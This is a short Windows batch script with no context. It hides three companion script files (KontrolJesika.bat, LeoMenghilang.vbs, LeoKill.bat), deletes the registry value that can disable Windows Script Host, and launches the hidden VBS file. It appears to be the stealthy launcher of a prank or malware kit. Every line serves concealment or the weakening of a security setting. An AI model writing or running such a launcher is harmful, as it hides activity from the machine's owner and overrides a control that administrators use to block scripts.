@echo off
attrib +h "KontrolJesika.bat"
attrib +h "LeoMenghilang.vbs"
attrib +h "LeoKill.bat"
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /f
start LeoMenghilang.vbs